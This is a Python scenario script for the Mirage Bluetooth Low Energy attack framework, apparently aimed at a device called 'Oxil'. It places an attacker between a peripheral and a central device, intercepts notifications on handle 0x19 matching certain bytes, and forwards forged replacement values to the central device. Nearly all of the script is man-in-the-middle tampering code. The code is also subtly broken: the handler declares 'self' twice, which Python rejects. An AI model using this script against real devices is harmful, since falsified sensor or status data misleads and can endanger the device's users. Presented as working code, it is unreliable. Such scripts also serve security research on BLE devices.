from mirage.core import scenario
from mirage.libs import io, ble, bt, utils

class Oxil(scenario.Scenario):
    def onStart(self):
        # This signal is triggered when the module starts
        self.a2sEmitter = self.module.a2sEmitter  # Attacker to Slave emitter
        self.a2sReceiver = self.module.a2sReceiver  # Attacker to Slave receiver
        self.a2mEmitter = self.module.a2mEmitter  # Attacker to Master emitter
        self.a2mReceiver = self.module.a2mReceiver  # Attacker to Master receiver
        self.first_if_executed = False  # Flag to indicate whether the first if statement is executed
        return True  # The default behaviour is executed

    def onSlaveHandleValueNotification(self, self, packet):
        if packet.handle == 0x19 and 0x5f in packet.value and 0x55 in packet.value and 0x0d in packet.value and 0x61 in packet.value:
            packet.show()
            newValue1 = bytes.fromhex("500ff0000d0d006410000000000055000000050100")
            io.info("---------Value modified (new value: " + newValue1.hex() + ") !")
            self.a2mEmitter.sendp(ble.BLEHandleValueNotification(handle=packet.handle, value=newValue1))
            self.first_if_executed = True  # Set the flag to True
            return False  # The default behaviour is not executed

        if self.first_if_executed and packet.handle == 0x19 and (len(packet.value.hex()) == 2):
            packet.show()
            newValue2 = bytes.fromhex("0b")
            io.info("---------Value modified (new value: " + newValue2.hex() + ")!!")
            self.a2mEmitter.sendp(ble.BLEHandleValueNotification(handle=packet.handle, value=newValue2))
            self.first_if_executed = False  # Reset the flag to False
            return False  # The default behaviour is not executed
        else:
            return True  # The default behaviour is executed

    def onEnd(self):
        return True  # The default behaviour is executed
